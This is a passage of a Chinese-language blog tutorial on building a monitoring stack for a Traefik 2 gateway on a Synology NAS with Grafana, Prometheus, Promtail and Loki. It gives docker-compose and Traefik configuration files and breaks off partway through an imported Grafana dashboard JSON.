[{"title":"Traefik 2 监控系统之Grafana Prometheus Promtail Loki完美结合","url":"http://www.yfgeek.com/2021/03/19/Traefik 2 监控系统 之Grafana、Prometheus、Loki完美结合/","content":"背景按上篇文章《Traefik 2 群晖硬核指南》，文章阐述了容器时代下如何替代Nginx，搭建一个基于Traefik 2，搭建自动SSL、容器自动服务注册、自动域名解析的统一网关，网关是搭建好了，我们还需要做服务监控，才能做到心中有数，有据可查。\n本文以上篇文章为范本，再次全流程的介绍如何搭建Traefik、Grafana、Prometheus、Promtail、Loki，并且如何配置服务，实现自动化日志记录、监控。\n效果图二话不说，咱们先看效果吧。\n\n\n\n\nTraefik按上篇文章，我们已经搭建了Traefik，但为了配合监控，我们需要对docker-compose.yml进行改造，因此，本文从头到尾的写一遍，您只需要看这一篇文章就够了，部分内容可能描述不够详细，有疑惑请到上一篇文章阅读。\ncd /volume1/docker/mkdir traefikcd traefikmkdir configmkdir ssl# 创建traefik专属网络docker network create traefik\n\n亮出我们的利器，通过docker-compose启动，编辑刚刚创建的yml文件 docker-compose.yml：\nversion: &#x27;3.7&#x27;services:  traefik:    container_name: traefik    environment:      - CF_API_EMAIL=CLOUDFLARE邮箱      - CLOUDFLARE_DNS_API_TOKEN=CLOUDFLARE API TOKEN      - CLOUDFLARE_ZONE_API_TOKEN=CLOUDFLARE API TOKEN    image: traefik:v2.1.3    restart: always    ports:      - target: 52080        published: 52080        mode: host      - target: 52443        published: 52443        mode: host      - target: 52022        published: 52022        mode: host      - &quot;8080:8080&quot;    command: traefik --configFile /etc/traefik.yml    volumes:      - /var/run/docker.sock:/var/run/docker.sock:ro      - ./ssl/:/data/ssl/:rw      - ./traefik.yml:/etc/traefik.yml:ro      - ./config/:/etc/traefik/config/:ro      - ./logs/:/data/logs/:rw    healthcheck:      test: [&quot;CMD-SHELL&quot;, &quot;wget -q --spider --proxy off localhost:8080/ping || exit 1&quot;]      interval: 6h    network_mode: host\n\n在根目录下新建文件traefik.yml，写入如下配置内容。\nglobal:  checkNewVersion: false  sendAnonymousUsage: falselog:  level: &quot;WARN&quot;  format: &quot;common&quot;  filePath: &quot;/data/logs/traefik.log&quot;api:  dashboard: true  insecure: trueping: &#123;&#125;accessLog:  filePath: &quot;/data/logs/access.log&quot;  bufferingSize: 100  format: json  filters:        minDuration: &quot;10ms&quot;providers:  docker:    watch: true    exposedByDefault: false    endpoint: &quot;unix:///var/run/docker.sock&quot;    swarmMode: false    useBindPortIP: false    network: &quot;traefik&quot;  file:    watch: true    directory: &quot;/etc/traefik/config&quot;    debugLogGeneratedTemplate: trueentryPoints:  http:    address: &quot;:52080&quot;    forwardedHeaders:      insecure: true  https:    address: &quot;:52443&quot;    forwardedHeaders:      insecure: true  ssh:    address: &quot;:52022&quot;    forwardedHeaders:      insecure: truecertificatesResolvers:  my:    acme:      email: &quot;CLOUDFLARE邮箱&quot;      storage: &quot;/data/ssl/acme.json&quot;      dnsChallenge:        resolvers: [&quot;1.1.1.1:53&quot;, &quot;8.8.8.8:53&quot;]        provider: &quot;cloudflare&quot;        delayBeforeCheck: 30metrics:  prometheus:    buckets:      - 0.1      - 0.3      - 1.2      - 5.0\n\n值得注意的是，因为运营商屏蔽了22、443、80端口，于是我使用52022、52443、52080做映射替代，如未被屏蔽，请忽略。\n为了自动申请SSL证书，提交成功率，我才用DNS Challenge的方式校验有效性，因此需Cloudflare的环境信息，如果你的域名没有配置Cloudflare解析，可以根据这篇文章置换相应变量。\n\n随后，进入config目录。\n创建dashboard.nas.yfgeek.com.toml文件，作为traefik展示面板的配置文件，因为相对固化，所以采用文件配置文件的形式，traefik支持文件加载配置。\n[http.middlewares.dash-compress.compress][http.middlewares.dash-auth.basicAuth]  users = [    &quot;test:$apr1$ux2tmr06$Qz5r/BNEfzdxriR/0o30Z1&quot;,  ][http.routers.dashboard]  rule = &quot;Host(`dashboard.nas.yfgeek.com`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;dashboard@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;][http.routers.api]  rule = &quot;Host(`dashboard.nas.yfgeek.com`) &amp;&amp; PathPrefix(`/api`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;api@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;][http.routers.ping]  rule = &quot;Host(`dashboard.nas.yfgeek.com`) &amp;&amp; PathPrefix(`/ping`)&quot;  entrypoints = [&quot;http&quot;]  service = &quot;ping@internal&quot;  middlewares = [&quot;dash-auth&quot;, &quot;dash-compress&quot;]\n\n这个文件中，我们设置了一个用于验证的中间件，进入网站之前会默认进行验证，密码是htpasswd生成规则，例子中用户名是test，密码是test，如需定制，可到这个网站生成密码。\n全部创建好后，目录结构如下：\n\n|____config| |____dashboard.nas.yfgeek.com.toml|____ssl|____docker-compose.yml|____traefik.yml\n\n确认无误，我们使用启动大法，执行如下命令。\ndocker-compose up -ddocker container logs traefik -f\n\n不出意外，服务即将启动成功，可以看到日志，如果有问题就见招拆招即可。\n具体可参考：https://github.com/yfgeek/traefik-docker-compose/tree/master/traefik\n搭建监控系统监控系统，你可能跟我说ELK？别试了，我已经试过了，这个对内存要求太高了，群晖咱承受不起，最终采用的方案如下：\n\nGrafanaGrafana 是一个用于监控和可视化观测的开源平台，支持非常丰富的数据源，在 Loki 技术栈中它专门用来展示来自 Prometheus 和 Loki 等数据源的时间序列数据。此外，还允许我们进行查询、可视化、报警等操作，可以用于创建、探索和共享数据 Dashboard，鼓励数据驱动的文化。\nPrometheusPrometheus受启发于Google的Brogmon监控系统（相似的Kubernetes是从Google的Brog系统演变而来），是一个开放性的监控解决方案，用户可以非常方便的安装和使用Prometheus并且能够非常方便的对其进行扩展。基于全新存储层的2.0版本，能更好地与容器平台、云平台配合。\nPromtailPromtail 是用来将容器日志发送到 Loki 或者 Grafana 服务上的日志收集工具，该工具主要包括发现采集目标以及给日志流添加上 Label 标签，然后发送给 Loki，另外 Promtail 的服务发现是基于 Prometheus 的服务发现机制实现的。\nLokiLoki 是一个受 Prometheus 启发的可以水平扩展、高可用以及支持多租户的日志聚合系统，使用了和 Prometheus 相同的服务发现机制，将标签添加到日志流中而不是构建全文索引。正因为如此，从 Promtail 接收到的日志和应用的 metrics 指标就具有相同的标签集。所以，它不仅提供了更好的日志和指标之间的上下文切换，还避免了对日志进行全文索引。\n开搞cd /volume1/docker/mkdir monitoring\n\n拷贝如下目录的全部文件：https://github.com/yfgeek/traefik-docker-compose/tree/master/monitoring\n编辑docker-compose.yml文件，更改granafa的host地址，可更改为内网。\nversion: &#x27;3.7&#x27;services:  prometheus:    image: prom/prometheus    volumes:      - ./prometheus/:/etc/prometheus/      - prometheus_data:/prometheus    command:      - &#x27;--config.file=/etc/prometheus/prometheus.yml&#x27;      - &#x27;--storage.tsdb.path=/prometheus&#x27;      - &#x27;--web.console.libraries=/usr/share/prometheus/console_libraries&#x27;      - &#x27;--web.console.templates=/usr/share/prometheus/consoles&#x27;    networks:      - inbound    labels:       - &quot;traefik.enable=true&quot;       - &quot;traefik.http.routers.prometheus.rule=Host(`prometheus`)&quot;       - &quot;traefik.http.routers.prometheus.entrypoints=http&quot;       - &quot;traefik.http.routers.prometheus.service=prometheus&quot;       - &quot;traefik.http.services.prometheus.loadbalancer.server.port=9090&quot;       - &quot;traefik.docker.network=inbound&quot;    grafana:    image: grafana/grafana    depends_on:      - prometheus    volumes:      - grafana_data:/var/lib/grafana      - ./grafana/provisioning/:/etc/grafana/provisioning/    env_file:      - ./grafana/config.monitoring    networks:      - inbound    user: &quot;472&quot;    labels:        - &quot;traefik.enable=true&quot;        - &quot;traefik.http.routers.grafana.rule=Host(`grf.nas.yfgeek.com`,`grafana`)&quot;        - &quot;traefik.http.routers.grafana.entrypoints=http&quot;        - &quot;traefik.http.routers.grafana.service=grafana&quot;        - &quot;traefik.http.services.grafana.loadbalancer.server.port=3000&quot;        - &quot;traefik.docker.network=inbound&quot;  loki:    image: grafana/loki    expose:      - &quot;3100&quot;    volumes:      - /volume1/docker/prometheus/loki/local-config.yaml:/etc/loki/local-config.yaml      - loki_data:/loki    command: -config.file=/etc/loki/local-config.yaml    networks:      - inbound  promtail:    image: grafana/promtail    depends_on:      - loki    volumes:      - /volume1/docker/traefik/logs:/var/log      - /volume1/docker/prometheus/promtail/config.yml:/etc/promtail/config.yml    command: -config.file=/etc/promtail/config.yml    networks:      - inboundnetworks:  inbound:    name: inboundvolumes:    prometheus_data: &#123;&#125;    grafana_data: &#123;&#125;    loki_data: &#123;&#125;\n\n确认无误后，执行大法。\ndocker-compose up -d\n\n等待docker都拉取完毕，创建好容器后，我们便可以通过访问设置的host地址，进入granafa登陆界面。\n\n输入用户名admin 密码admin （密码后续可改），进入监控页面，点击如图所示的按钮，随后点击Add data source，添加数据源。\n\n依次添加prometheus、loki\n\n具体配置如下\nprometheus地址：http://prometheus:9090\nloki地址：http://loki:3100\n\n\n设置完成后，点击Save &amp; Test 看到绿色成功，即设置成功。\n日志检索数据源添加完毕后，可以到Explore页面中，检查日志是否上送。\n!grf6.png)\nTraefik 大盘点击加号按钮，点击Import，通过如下ID导入 12250，随后Import即可。\nLoki 大盘因为我在Promtail过程中更改了默认的job名字，可根据ID 13713导入后，手动更改配置，也可以直接通过JSON导入。点击加号按钮，点击Import，通过如下JSON导入：\n&#123;&quot;annotations&quot;:&#123;&quot;list&quot;:[&#123;&quot;builtIn&quot;:1,&quot;datasource&quot;:&quot;-- Grafana --&quot;,&quot;enable&quot;:true,&quot;hide&quot;:true,&quot;iconColor&quot;:&quot;rgba(0, 211, 255, 1)&quot;,&quot;name&quot;:&quot;Annotations &amp; Alerts&quot;,&quot;type&quot;:&quot;dashboard&quot;&#125;]&#125;,&quot;description&quot;:&quot;Loki version 2 showcase using JSON Traefik access logs.&quot;,&quot;editable&quot;:true,&quot;gnetId&quot;:13713,&quot;graphTooltip&quot;:0,&quot;id&quot;:4,&quot;links&quot;:[],&quot;panels&quot;:[&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[]&#125;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:2,&quot;w&quot;:24,&quot;x&quot;:0,&quot;y&quot;:0&#125;,&quot;id&quot;:32,&quot;interval&quot;:&quot;&quot;,&quot;options&quot;:&#123;&quot;content&quot;:&quot;&lt;div class=\\&quot;left dashboard-header\\&quot;&gt;\\n   &lt;img src=\\&quot;https://marketplace-assets.digitalocean.com/logos/loki-logo.svg\\&quot; style=\\&quot;height:29px;\\&quot;/&gt;\\n  &lt;span&gt;Traefik Dashboard&lt;/span&gt;\\n&lt;/div&gt;&quot;,&quot;mode&quot;:&quot;html&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;loki_build_info&quot;,&quot;format&quot;:&quot;table&quot;,&quot;instant&quot;:false,&quot;interval&quot;:&quot;&quot;,&quot;legendFormat&quot;:&quot;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:null,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;&quot;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;text&quot;&#125;,&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;mappings&quot;:[],&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[&#123;&quot;color&quot;:&quot;purple&quot;,&quot;value&quot;:null&#125;]&#125;,&quot;unit&quot;:&quot;short&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:4,&quot;w&quot;:6,&quot;x&quot;:0,&quot;y&quot;:2&#125;,&quot;id&quot;:4,&quot;interval&quot;:&quot;1m&quot;,&quot;options&quot;:&#123;&quot;colorMode&quot;:&quot;background&quot;,&quot;graphMode&quot;:&quot;area&quot;,&quot;justifyMode&quot;:&quot;auto&quot;,&quot;orientation&quot;:&quot;auto&quot;,&quot;reduceOptions&quot;:&#123;&quot;calcs&quot;:[&quot;sum&quot;],&quot;fields&quot;:&quot;&quot;,&quot;values&quot;:false&#125;,&quot;text&quot;:&#123;&#125;,&quot;textMode&quot;:&quot;value&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;sum(count_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot; [$__interval]))&quot;,&quot;legendFormat&quot;:&quot;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;1h&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Total requests  &quot;,&quot;transformations&quot;:[],&quot;transparent&quot;:true,&quot;type&quot;:&quot;stat&quot;&#125;,&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;mappings&quot;:[],&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[&#123;&quot;color&quot;:&quot;light-blue&quot;,&quot;value&quot;:null&#125;]&#125;,&quot;unit&quot;:&quot;short&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:8,&quot;w&quot;:9,&quot;x&quot;:6,&quot;y&quot;:2&#125;,&quot;id&quot;:5,&quot;interval&quot;:&quot;30s&quot;,&quot;options&quot;:&#123;&quot;colorMode&quot;:&quot;background&quot;,&quot;graphMode&quot;:&quot;area&quot;,&quot;justifyMode&quot;:&quot;auto&quot;,&quot;orientation&quot;:&quot;auto&quot;,&quot;reduceOptions&quot;:&#123;&quot;calcs&quot;:[&quot;sum&quot;],&quot;fields&quot;:&quot;&quot;,&quot;values&quot;:false&#125;,&quot;text&quot;:&#123;&#125;,&quot;textMode&quot;:&quot;auto&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;sum by (OriginStatus) (count_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot; | json |  __error__=\\&quot;\\&quot; [$__interval]))&quot;,&quot;legendFormat&quot;:&quot;HTTP Status: &#123;&#123;OriginStatus&#125;&#125;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;3h&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Requests per status code&quot;,&quot;transformations&quot;:[],&quot;transparent&quot;:true,&quot;type&quot;:&quot;stat&quot;&#125;,&#123;&quot;cacheTimeout&quot;:null,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;mappings&quot;:[],&quot;noValue&quot;:&quot;0&quot;,&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[&#123;&quot;color&quot;:&quot;purple&quot;,&quot;value&quot;:null&#125;,&#123;&quot;color&quot;:&quot;red&quot;,&quot;value&quot;:80&#125;]&#125;,&quot;unit&quot;:&quot;percent&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:4,&quot;w&quot;:4,&quot;x&quot;:15,&quot;y&quot;:2&#125;,&quot;id&quot;:19,&quot;interval&quot;:&quot;5m&quot;,&quot;links&quot;:[],&quot;maxDataPoints&quot;:1,&quot;options&quot;:&#123;&quot;colorMode&quot;:&quot;background&quot;,&quot;graphMode&quot;:&quot;none&quot;,&quot;justifyMode&quot;:&quot;center&quot;,&quot;orientation&quot;:&quot;auto&quot;,&quot;reduceOptions&quot;:&#123;&quot;calcs&quot;:[&quot;mean&quot;],&quot;fields&quot;:&quot;&quot;,&quot;values&quot;:false&#125;,&quot;text&quot;:&#123;&#125;,&quot;textMode&quot;:&quot;value&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot; sum(rate(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |~ \\&quot;RequestProtocol\\&quot; | json | OriginStatus &gt;= 400 |__error__=\\&quot;\\&quot;[$__interval])) / (sum(rate(&#123;job=\\&quot;/var/log/traefik.log\\&quot;&#125; |~ \\&quot;RequestProtocol\\&quot; | json | __error__=\\&quot;\\&quot;[$__interval])) / 100)&quot;,&quot;legendFormat&quot;:&quot;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;1h&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;% of  4/5xx &quot;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;stat&quot;&#125;,&#123;&quot;aliasColors&quot;:&#123;&#125;,&quot;bars&quot;:false,&quot;cacheTimeout&quot;:null,&quot;dashLength&quot;:10,&quot;dashes&quot;:false,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[]&#125;,&quot;unit&quot;:&quot;none&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;fill&quot;:1,&quot;fillGradient&quot;:0,&quot;gridPos&quot;:&#123;&quot;h&quot;:4,&quot;w&quot;:5,&quot;x&quot;:19,&quot;y&quot;:2&#125;,&quot;hiddenSeries&quot;:false,&quot;id&quot;:36,&quot;interval&quot;:&quot;1m&quot;,&quot;legend&quot;:&#123;&quot;avg&quot;:false,&quot;current&quot;:false,&quot;hideEmpty&quot;:true,&quot;hideZero&quot;:true,&quot;max&quot;:false,&quot;min&quot;:false,&quot;show&quot;:false,&quot;total&quot;:false,&quot;values&quot;:false&#125;,&quot;lines&quot;:true,&quot;linewidth&quot;:1,&quot;links&quot;:[],&quot;nullPointMode&quot;:&quot;null&quot;,&quot;options&quot;:&#123;&quot;alertThreshold&quot;:true&#125;,&quot;percentage&quot;:false,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;pointradius&quot;:2,&quot;points&quot;:false,&quot;renderer&quot;:&quot;flot&quot;,&quot;seriesOverrides&quot;:[],&quot;spaceLength&quot;:10,&quot;stack&quot;:false,&quot;steppedLine&quot;:false,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot; sum by (OriginStatus,ServiceName) (count_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |~ \\&quot;RequestProtocol\\&quot; | json | OriginStatus &gt;= 400 |__error__=\\&quot;\\&quot;[$__interval]))&quot;,&quot;legendFormat&quot;:&quot; &#123;&#123;ServiceName&#125;&#125; / &#123;&#123;OriginStatus&#125;&#125; &quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;thresholds&quot;:[],&quot;timeFrom&quot;:&quot;3h&quot;,&quot;timeRegions&quot;:[],&quot;timeShift&quot;:null,&quot;title&quot;:&quot; 4/5xx  Services&quot;,&quot;tooltip&quot;:&#123;&quot;shared&quot;:true,&quot;sort&quot;:0,&quot;value_type&quot;:&quot;individual&quot;&#125;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;graph&quot;,&quot;xaxis&quot;:&#123;&quot;buckets&quot;:null,&quot;mode&quot;:&quot;time&quot;,&quot;name&quot;:null,&quot;show&quot;:false,&quot;values&quot;:[]&#125;,&quot;yaxes&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:405&quot;,&quot;decimals&quot;:0,&quot;format&quot;:&quot;none&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:&quot;0&quot;,&quot;show&quot;:true&#125;,&#123;&quot;$$hashKey&quot;:&quot;object:406&quot;,&quot;format&quot;:&quot;short&quot;,&quot;label&quot;:null,&quot;logBase&quot;:1,&quot;max&quot;:null,&quot;min&quot;:null,&quot;show&quot;:false&#125;],&quot;yaxis&quot;:&#123;&quot;align&quot;:false,&quot;alignLevel&quot;:null&#125;&#125;,&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;mappings&quot;:[],&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[&#123;&quot;color&quot;:&quot;purple&quot;,&quot;value&quot;:null&#125;]&#125;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:4,&quot;w&quot;:6,&quot;x&quot;:0,&quot;y&quot;:6&#125;,&quot;id&quot;:22,&quot;interval&quot;:&quot;5m&quot;,&quot;options&quot;:&#123;&quot;colorMode&quot;:&quot;background&quot;,&quot;graphMode&quot;:&quot;none&quot;,&quot;justifyMode&quot;:&quot;auto&quot;,&quot;orientation&quot;:&quot;auto&quot;,&quot;reduceOptions&quot;:&#123;&quot;calcs&quot;:[&quot;mean&quot;],&quot;fields&quot;:&quot;&quot;,&quot;values&quot;:false&#125;,&quot;text&quot;:&#123;&#125;,&quot;textMode&quot;:&quot;value&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;count(sum by (ClientHost) (count_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125;|= \\&quot;RequestProtocol\\&quot; | json |  __error__=\\&quot;\\&quot; [$__interval])))&quot;,&quot;legendFormat&quot;:&quot;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;5m&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Users right now&quot;,&quot;transformations&quot;:[],&quot;transparent&quot;:true,&quot;type&quot;:&quot;stat&quot;&#125;,&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;mappings&quot;:[],&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[&#123;&quot;color&quot;:&quot;purple&quot;,&quot;value&quot;:null&#125;]&#125;,&quot;unit&quot;:&quot;decbytes&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:4,&quot;w&quot;:8,&quot;x&quot;:15,&quot;y&quot;:6&#125;,&quot;id&quot;:8,&quot;interval&quot;:&quot;1m&quot;,&quot;options&quot;:&#123;&quot;colorMode&quot;:&quot;background&quot;,&quot;graphMode&quot;:&quot;none&quot;,&quot;justifyMode&quot;:&quot;center&quot;,&quot;orientation&quot;:&quot;auto&quot;,&quot;reduceOptions&quot;:&#123;&quot;calcs&quot;:[&quot;sum&quot;],&quot;fields&quot;:&quot;&quot;,&quot;values&quot;:false&#125;,&quot;text&quot;:&#123;&#125;,&quot;textMode&quot;:&quot;value&quot;&#125;,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;sum_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125;|= \\&quot;RequestProtocol\\&quot; | json | OriginStatus=200 | unwrap DownstreamContentSize |  __error__=\\&quot;\\&quot; [$__interval])&quot;,&quot;legendFormat&quot;:&quot;Bytes sent&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;5m&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Total Bytes Sent&quot;,&quot;transformations&quot;:[&#123;&quot;id&quot;:&quot;reduce&quot;,&quot;options&quot;:&#123;&quot;reducers&quot;:[&quot;sum&quot;]&#125;&#125;,&#123;&quot;id&quot;:&quot;organize&quot;,&quot;options&quot;:&#123;&quot;excludeByName&quot;:&#123;&#125;,&quot;indexByName&quot;:&#123;&#125;,&quot;renameByName&quot;:&#123;&quot;Total&quot;:&quot;Bytes Sent&quot;&#125;&#125;&#125;],&quot;transparent&quot;:true,&quot;type&quot;:&quot;stat&quot;&#125;,&#123;&quot;aliasColors&quot;:&#123;&#125;,&quot;breakPoint&quot;:&quot;50%&quot;,&quot;cacheTimeout&quot;:null,&quot;combine&quot;:&#123;&quot;label&quot;:&quot;Others&quot;,&quot;threshold&quot;:0&#125;,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;thresholds&quot;:&#123;&quot;mode&quot;:&quot;absolute&quot;,&quot;steps&quot;:[]&#125;&#125;,&quot;overrides&quot;:[]&#125;,&quot;fontSize&quot;:&quot;80%&quot;,&quot;format&quot;:&quot;short&quot;,&quot;gridPos&quot;:&#123;&quot;h&quot;:8,&quot;w&quot;:8,&quot;x&quot;:0,&quot;y&quot;:10&#125;,&quot;id&quot;:33,&quot;interval&quot;:&quot;5m&quot;,&quot;legend&quot;:&#123;&quot;percentage&quot;:true,&quot;show&quot;:true,&quot;values&quot;:true&#125;,&quot;legendType&quot;:&quot;Right side&quot;,&quot;links&quot;:[],&quot;maxDataPoints&quot;:3,&quot;nullPointMode&quot;:&quot;connected&quot;,&quot;pieType&quot;:&quot;pie&quot;,&quot;pluginVersion&quot;:&quot;7.3.4&quot;,&quot;strokeWidth&quot;:1,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;sum by (RouterName) (count_over_time(&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125;|= \\&quot;RequestProtocol\\&quot; | json |  __error__=\\&quot;\\&quot; [$__interval]))&quot;,&quot;legendFormat&quot;:&quot;&#123;&#123;RouterName&#125;&#125;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;1h&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Requests Route&quot;,&quot;transformations&quot;:[],&quot;transparent&quot;:true,&quot;type&quot;:&quot;grafana-piechart-panel&quot;,&quot;valueName&quot;:&quot;current&quot;&#125;,&#123;&quot;datasource&quot;:&quot;Loki&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;&#125;,&quot;overrides&quot;:[]&#125;,&quot;gridPos&quot;:&#123;&quot;h&quot;:8,&quot;w&quot;:16,&quot;x&quot;:8,&quot;y&quot;:10&#125;,&quot;id&quot;:11,&quot;interval&quot;:&quot;&quot;,&quot;options&quot;:&#123;&quot;showLabels&quot;:false,&quot;showTime&quot;:true,&quot;sortOrder&quot;:&quot;Descending&quot;,&quot;wrapLogMessage&quot;:false&#125;,&quot;targets&quot;:[&#123;&quot;expr&quot;:&quot;&#123;filename=\\&quot;/var/log/access.log\\&quot;&#125; |= \\&quot;RequestProtocol\\&quot;| json  | line_format \\&quot;Status:&#123;&#123;.OriginStatus&#125;&#125; Client From &#123;&#123;.ClientAddr&#125;&#125; &#123;&#123;.RequestMethod&#125;&#125; &#123;&#123;.RequestAddr&#125;&#125;&#123;&#123;.RequestPath&#125;&#125; Route To &#123;&#123;.ServiceAddr&#125;&#125;\\&quot;&quot;,&quot;legendFormat&quot;:&quot;&quot;,&quot;refId&quot;:&quot;A&quot;&#125;],&quot;timeFrom&quot;:&quot;5m&quot;,&quot;timeShift&quot;:null,&quot;title&quot;:&quot;Logs&quot;,&quot;transparent&quot;:true,&quot;type&quot;:&quot;logs&quot;&#125;,&#123;&quot;aliasColors&quot;:&#123;&quot;95th percentile&quot;:&quot;blue&quot;,&quot;max latency&quot;:&quot;super-light-blue&quot;&#125;,&quot;bars&quot;:false,&quot;dashLength&quot;:10,&quot;dashes&quot;:false,&quot;datasource&quot;:&quot;Loki&quot;,&quot;description&quot;:&quot;&quot;,&quot;fieldConfig&quot;:&#123;&quot;defaults&quot;:&#123;&quot;custom&quot;:&#123;&#125;,&quot;unit&quot;:&quot;ns&quot;&#125;,&quot;overrides&quot;:[]&#125;,&quot;fill&quot;:5,&quot;fillGradient&quot;:9,&quot;gridPos&quot;:&#123;&quot;h&quot;:9,&quot;w&quot;:8,&quot;x&quot;:0,&quot;y&quot;:18&#125;,&quot;hiddenSeries&quot;:false,&quot;id&quot;:16,&quot;interval&quot;:&quot;30s&quot;,&quot;legend&quot;:&#123;&quot;alignAsTable&quot;:false,&quot;avg&quot;:false,&quot;current&quot;:false,&quot;max&quot;:true,&quot;min&quot;:false,&quot;rightSide&quot;:false,&quot;show&quot;:true,&quot;total&quot;:false,&quot;values&quot;:true&#125;,&quot;lines&quot;:true,&quot;linewidth&quot;:1,&quot;nullPointMode&quot;:&quot;null&quot;,&quot;options&quot;:&#123;&quot;alertThreshold&quot;:true&#125;,&quot;percentage&quot;:false,&quot;pluginVersion&quot;:&quot;7.4.3&quot;,&quot;pointradius&quot;:2,&quot;points&quot;:false,&quot;renderer&quot;:&quot;flot&quot;,&quot;seriesOverrides&quot;:[&#123;&quot;$$hashKey&quot;:&quot;object:232&quot;,&quot;alias&quot;:&quot;max